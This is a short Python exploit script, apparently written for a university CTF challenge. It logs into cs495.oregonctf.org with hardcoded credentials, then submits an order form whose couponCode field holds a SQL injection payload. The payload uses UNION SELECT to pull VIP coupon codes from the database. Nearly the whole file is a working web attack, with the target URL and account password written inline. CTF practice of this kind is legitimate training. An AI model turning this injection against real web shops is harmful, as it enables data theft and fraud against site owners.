import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62"

postData = {"megustaAmount":0,
            "trollAmount":1,
            "rageAmount":0,
            "notBadAmount":0,
            "couponCode": "\' UNION SELECT COUPONCODE FROM VIPCOUPONS WHERE itemId = \"1\" \" -- "}

response2 = session.post(targetUrl, data=postData)
print(response2.text)
